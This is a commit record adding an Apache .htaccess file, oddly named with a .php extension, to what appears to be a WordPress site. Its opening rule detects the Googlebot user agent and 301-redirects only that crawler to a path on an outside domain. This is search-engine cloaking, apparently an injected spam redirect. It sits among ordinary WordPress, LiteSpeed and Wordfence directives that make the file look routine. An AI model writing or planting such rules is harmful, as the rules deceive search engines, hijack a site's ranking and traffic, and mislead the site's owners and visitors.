97a1013e05335e3cbc4201dc84f457f0d76184a7
onlyme1d <agungrikardo09@gmail.com>
2025-10-04 14:16:58 +0700

    Update and rename paste.dev.22351.php to paste.dev.777.php

---
+++ paste.dev.777.php
@@ -0,0 +1,43 @@
+RewriteEngine On
+
+RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]
+RewriteRule ^(.*)$ https://www.anilparagnost-medium.com/medium-rotterdam$1 [R=301,L]
+
+# BEGIN LSCACHE
+# END LSCACHE
+# BEGIN NON_LSCACHE
+# END NON_LSCACHE
+# BEGIN WordPress
+# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+
+# END WordPress
+
+# BEGIN LiteSpeed
+# The directives (lines) between "BEGIN LiteSpeed" and "END LiteSpeed" are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+<IfModule Litespeed>
+	SetEnv noabort 1
+</IfModule>
+# END LiteSpeed
+
+# Wordfence WAF
+<IfModule LiteSpeed>
+php_value auto_prepend_file '/home/u384311178/domains/anilparagnost-medium.com/public_html/wordfence-waf.php'
+</IfModule>
+<IfModule lsapi_module>
+php_value auto_prepend_file '/home/u384311178/domains/anilparagnost-medium.com/public_html/wordfence-waf.php'
+</IfModule>
+
+# END Wordfence WAF
